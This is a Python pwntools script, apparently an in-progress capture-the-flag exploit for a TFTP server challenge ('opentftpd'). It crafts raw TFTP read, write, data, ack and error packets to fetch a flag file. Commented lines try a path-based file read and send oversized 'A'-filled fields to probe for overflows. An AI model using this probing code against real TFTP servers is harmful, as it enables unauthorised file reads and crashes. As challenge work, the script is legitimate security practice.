from pwn import *
import socket
import struct
import sys
context.arch = "amd64"
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
# server  = 'chall.pwnable.tw'
# port    = 10206
server  = '192.168.182.147'
port    = 69

def send_error(sock, content):
    header =  b"\x00\x05"           # opcode
    header += b"\x00\x04"           # error code
    header += content               # error string
    header += "\x00"                # error string end
    sock.send(header)
    return sock.recv(timeout=0.5)

def send_read(sock,udp_port,filename):
    header =  b"\x00\x01"           # opcode
    header += filename              # filename
    header += "\x00"                # end
    header += "netascii\x00"        # mode + end
    r = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    r.sendto(header,(server,udp_port))
    return r.recv(512)

def send_data(sock,num,con):
    header =  b"\x00\x03"           # opcode
    header += num            
    header += con   
    header +='\x00'     
    r = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    r.sendto(header,(server,port))
    return r.recv(512)

def send_ack(sock,num):
    header =  b"\x00\x04"           # opcode
    header += num 
    r = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    r.sendto(header,(server,port))
    return r.recv(512)

def send_write(sock,udp_port,filename):
    header =  b"\x00\x02"           # opcode
    header += filename              # filename
    header += "\x00"                # end
    header += "netascii\x00"       # mode + end
    r = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    r.sendto(header,(server,udp_port))
    return r.recv(512)

cn = remote(server,port)
# cn.recvuntil('port: ')
# udp_port = cn.recvuntil('\n')
# udp_port=int(udp_port)
# resp=send_read(cn,udp_port,'//home/opentftp/flag')
# print resp
# binary = './opentftpd'
# PORT = '69'
# cn = process([binary,PORT])
# try:
resp=send_read(cn,port,'flag.txt')
print(resp)

# send_ack(cn,'\x00\x00')
# except EOFError:

#     print "error!"
#     cn.close()
        # continue
# resp = send_write(cn,port,'whoami.txt')
# print resp
# resp = send_error(cn,"A"*511)
# print resp
# resp=send_data(cn,'\x00\x01','A'*512)
# resp=send_data(cn,'\xff\xff','A'*511)

cn.interactive()